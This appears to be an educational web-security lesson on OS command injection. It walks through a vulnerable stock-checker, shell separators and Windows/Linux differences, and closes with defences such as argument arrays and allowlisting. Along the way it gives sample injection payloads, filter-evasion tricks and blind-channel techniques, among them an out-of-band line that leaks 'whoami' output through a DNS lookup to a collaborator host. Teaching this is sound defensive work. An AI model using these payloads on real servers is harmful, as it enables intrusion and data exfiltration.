---
title: OS Command Injection · Case File 15 (System Shells)
description: Follow user input as it escapes web applications into the operating system terminal, explore command separators, and master in-band and blind exfiltration channels.
---

# OS Command Injection · The Terminal Hijack Investigation

<p class="wd-section-lede">OS command injection is one of the most severe backend vulnerabilities on the web. It occurs when a web server takes untrusted user input and pastes it directly into a system terminal command. Because the operating system terminal interprets certain punctuation marks as instructions to chain or redirect commands, an attacker can append their own instructions and take control of the server operating system.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: The Voice Assistant Trap.</strong> Imagine speaking to a smart home voice assistant: <em>"Add milk to my grocery list."</em> The assistant dutifully adds "milk". But what if someone says: <em>"Add milk to my grocery list; and unlock the front door"</em>? If the assistant isn't programmed to treat everything following "Add" as grocery text, it interprets the semicolon as a cue to start a brand-new task—and unlocks your door. In OS command injection, the system shell (Bash or cmd.exe) is that obedient assistant.</p>
</div>

---

## Case File #15: Behind the Scenes of a Stock Checker

Let's examine what happens when an e-commerce website checks how many items remain in a local warehouse.

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You view a product page and click <strong>Check stock</strong>. In your browser's network tab, you observe a POST request sent to the server:</p>
    <div class="language-http"><pre><code>POST /product/stock HTTP/1.1
productId=1&amp;storeId=2</code></pre></div>
    <p>The screen immediately updates with the message: <code>"53 items in stock"</code>.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>Instead of querying a database directly, the backend was written by a developer who reused an existing internal command-line tool. The web application builds a shell command by gluing your input onto the terminal line:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Server Terminal Command</span>
        <span><span class="wd-code-input">Gold</span> = Input From Your HTTP Request</span>
      </div>
      <span class="wd-code-dev">/usr/local/bin/stockcheck.sh 1 </span><span class="wd-code-input">2</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>The developer assumed <code>storeId</code> would only ever be a single digit like <code>2</code>. But if you submit <code>2 &amp; whoami</code>, the system shell recognizes <code>&amp;</code> as a <Term id="shell-metacharacter">shell separator</Term>. It runs <code>stockcheck.sh 1 2</code> in the background, immediately executes <code>whoami</code>, and prints the server user account (e.g. <code>peter-user</code>) directly into the web page!</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers avoid invoking the system shell altogether. By using argument-vector APIs (like <code>execFile</code> in Node.js or <code>subprocess.run(["cmd", arg], shell=False)</code> in Python), the operating system launches the binary directly without passing the text through a shell parser. Punctuation characters like <code>;</code> or <code>&amp;</code> are treated as harmless literal text.</p>
  </div>
</div>

### Visual Comparison: Concatenation vs. Parameter Arrays

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer thought <code>storeId</code> would always be an integer like <code>1</code> or <code>2</code>. The shell would execute one program with two numerical arguments and print the warehouse inventory.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>The user entered <code>2; whoami</code>. Because the code invoked a shell (e.g., <code>system()</code> or <code>exec()</code>), the shell treated <code>;</code> as a command terminator and spawned <code>whoami</code> as a completely independent second command.</p>
  </div>
</div>

### Watch the Command Split Color by Color

See how punctuation changes the sentence structure of a shell command:

<div class="wd-codesplit">
  <div class="wd-codesplit__legend">
    <span><span class="wd-code-dev">Blue</span> = Intended Server Command</span>
    <span><span class="wd-code-input">Gold</span> = Injected Separator &amp; Command</span>
  </div>
  <span class="wd-code-dev">/usr/local/bin/stockcheck.sh 1 </span><span class="wd-code-input">2; whoami</span>
</div>

::: details 🔬 Under the Hood: Why Passing Arguments as an Array Cures the Bug
When code calls:
```python
# VULNERABLE: Invokes /bin/sh to interpret the full string
os.system(f"stockcheck.sh {product_id} {store_id}")
```
The OS starts `/bin/sh -c "stockcheck.sh 1 2; whoami"`. The shell lexes the string, discovers the semicolon, and runs two commands.

In contrast, when code uses an argument array:
```python
# SECURE: Direct system call (execve), NO shell is launched
subprocess.run(["/usr/local/bin/stockcheck.sh", product_id, store_id], shell=False)
```
The operating system calls the low-level `execve` syscall. The string `"2; whoami"` is passed directly into `argv[2]` of `stockcheck.sh`. Because no shell is ever spawned to interpret the semicolon, the script simply looks for a store literally named `"2; whoami"` and safely reports that no such store exists.
:::

---

## The 5-Stage Journey of an Injected Command

Tracing how an operating system processes terminal commands explains why separators behave the way they do:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. HTTP Request</strong>
    Browser sends input containing metacharacters (e.g. <code>storeId=2|whoami</code>).
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>2. Shell Spawn</strong>
    Web app executes <code>system()</code>, spawning <code>/bin/sh -c</code> with concatenated text.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. Metacharacter Tokenization</strong>
    Shell parser identifies <code>|</code> or <code>;</code> as command boundary tokens.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>4. Command Execution</strong>
    Kernel executes the primary binary and then proceeds to the secondary command.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>5. Output Collection</strong>
    Output is reflected in HTTP response or observed via a side-channel.
  </div>
</div>

---

## The Detective's Metacharacter Toolkit

System shells support a rich grammar of punctuation marks. Here are the primary characters used to chain commands and control data flow:

| Separator | Shell Behavior | When to Use It |
| --- | --- | --- |
| `&` | Runs the command on the left in the background and immediately starts the next command. | Great when the first command takes a long time or hangs. |
| `&&` | Runs the second command only if the first command succeeds (exit code 0). | Clean chaining when original arguments are valid. |
| `\|` | Pipes the standard output of the left command into the input of the right command. | Works when the original command doesn't mind receiving piped data. |
| `\|\|` | Runs the second command only if the first command fails (non-zero exit code). | Ideal when your input invalidates the original command! |
| `;` or `\n` | Runs commands sequentially, regardless of whether the first succeeded. | The universal sequential separator on Unix/Linux. |
| `$(cmd)` or `` `cmd` `` | Command substitution: executes <code>cmd</code> and inserts its text output in place. | Perfect for embedding command results into URLs or filenames. |

::: details ⚙️ Engine Variations: Linux (Bash/sh) vs. Windows (cmd.exe / PowerShell)
- **Linux (`/bin/sh`, `bash`):** Uses `;`, `&`, `&&`, `|`, `||`, and newlines (`\n`). Command substitution uses `$(whoami)` or `` `whoami` ``. Whitespace can be substituted with `${IFS}` if spaces are filtered.
- **Windows (`cmd.exe`):** Semicolons do not separate commands! Use `&`, `&&`, `|`, or `||`. Environment variables use `%USERNAME%`. To test delays, use `ping -n 10 127.0.0.1` instead of `sleep`.
- **Windows (PowerShell):** Uses `;`, `|`, `&&`, `||`, and `$(command)`. Backtick (<code>`</code>) is the escape character.
:::

---

## Direct In-Band Command Execution

In the simplest scenario, the web server captures whatever the terminal prints (`stdout`) and reflects it directly into the HTML response. When you append a command separator and a command like `whoami`, the current system user is printed on screen.

<LabGroup ids="command-injection-lab-simple" />

---

## The 4 Blind Channels: Investigating Without Screen Output

In real-world audits, web applications rarely print terminal output back to the screen. The server runs the command in the background, discards the output, and returns a generic "Thank you" or "Stock checked" response. When the screen gives you no clues, you investigate using **side channels**:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>⏱️ 1. Time Delays</strong>
    Make the server pause (e.g., <code>sleep 10</code>). If the response takes exactly 10 seconds, the command ran!
  </div>
  <div class="wd-flow__node">
    <strong>📁 2. Output Redirection</strong>
    Write command output to a public web folder (<code>whoami &gt; /var/www/static/out.txt</code>) and browse to it.
  </div>
  <div class="wd-flow__node">
    <strong>📡 3. Out-of-Band (OAST)</strong>
    Trigger a DNS lookup or HTTP request to your own server using tools like <code>nslookup</code> or <code>curl</code>.
  </div>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>📦 4. Data Exfiltration</strong>
    Embed command results inside a DNS lookup: <code>nslookup $(whoami).your-subdomain.com</code>.
  </div>
</div>

### 1. Timing Delays
If the server doesn't show output, you can ask it to sleep. If a request normally takes 120ms, but supplying `|| sleep 10 #` causes the response to take exactly 10,120ms, you have confirmed code execution.

### 2. Output Redirection
If the web server has write permissions to a static folder (like `/var/www/images/`), you can use shell redirection (`>`) to write command output into a file and then load that file in your browser: `|| whoami > /var/www/static/whoami.txt #`.

### 3. Out-of-Band (OAST) Signals
Firewalls may block incoming traffic and responses, but outgoing DNS queries are often allowed. Triggering a DNS request using `nslookup` or `dig` against a Burp Collaborator domain confirms execution even when no HTTP connection can leave the network.

### 4. Out-of-Band Exfiltration
By combining command substitution with an out-of-band lookup, the server runs a command, captures the output, and attaches it as a subdomain prefix on a DNS query: `nslookup $(whoami).burpcollaborator.net`. Your DNS listener receives a lookup for `peter-user.burpcollaborator.net`, reading data out of the network!

<LabGroup ids="command-injection-lab-blind-time-delays, command-injection-lab-blind-output-redirection, command-injection-lab-blind-out-of-band, command-injection-lab-blind-out-of-band-data-exfiltration" />

---

## Defensive Blueprint: Eliminating Command Injection

Protecting applications from command injection requires eliminating shells from the architecture:

<div class="wd-callout wd-callout--warn">
<p><strong>🛡️ The 3 Layers of Terminal Security:</strong></p>
<ol>
  <li><strong>Avoid system shells entirely (Best Practice):</strong> Use built-in programming language APIs instead of command-line tools. For example, to read a file or resize an image, use native libraries rather than calling <code>cat</code> or <code>ImageMagick</code> via the shell.</li>
  <li><strong>Pass arguments as vectors (execve):</strong> If invoking an external binary is mandatory, use APIs that pass arguments as an explicit list/array (e.g. <code>ProcessBuilder</code> in Java, <code>subprocess.run(["cmd", arg], shell=False)</code> in Python). Never pass a concatenated string to <code>/bin/sh</code>.</li>
  <li><strong>Strict input allowlisting:</strong> Validate that arguments conform to a strict whitelist of expected characters (e.g. numbers only: <code>^[0-9]+$</code>). Reject any input containing unexpected punctuation.</li>
</ol>
</div>

<TopicComplete topic-id="os-command-injection" label="Mark OS command injection complete" />
